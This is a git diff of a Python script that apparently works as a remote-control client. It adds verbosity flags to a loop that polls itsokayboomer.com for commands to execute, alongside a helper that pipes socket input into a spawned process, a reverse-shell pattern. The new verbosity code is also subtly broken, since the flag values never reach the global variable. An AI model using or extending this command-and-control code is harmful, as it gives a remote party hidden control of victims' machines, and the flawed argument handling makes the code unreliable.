@@ -7,6 +7,7 @@ import pyautogui
 import base64
 import sys
 import os, socket, subprocess, threading, sys
+import argparse
 
 def s2p(s, p):
     while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
@@ -23,8 +24,19 @@ if(platform == "win32"):
     from io import StringIO
     import PIL.Image
 
-### todo: argparse for verbosity and optional key when not using file + specify os if there are problems ###
+verbosity = 0
+def parser():                                                               #for extra options
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-v', help='display additional output', action='store_true')
+    parser.add_argument('--vv', help='display even more output!', action='store_true')
+    args = parser.parse_args()
 
+    if args.v:
+        verbosity = 1
+    if args.vv:
+        verbosity = 2
+
+parser()
 f = open("../../apikey.txt", "r")
 key = f.read()
 
@@ -64,7 +76,8 @@ while True:
         r = requests.get("https://itsokayboomer.com/dequeue/dequeue.php?api="+key+"&param=command")
         if(r.text != "API key does not exist!"):
             command = r.text
-            print(command)
+            if(verbosity > 0):      #prints newlines to see that this part is running idk
+                print(command)
             if(command != ""):
                 r = requests.get("https://itsokayboomer.com/dequeue/dequeue.php?api="+key)
                 data = json.loads(r.text)
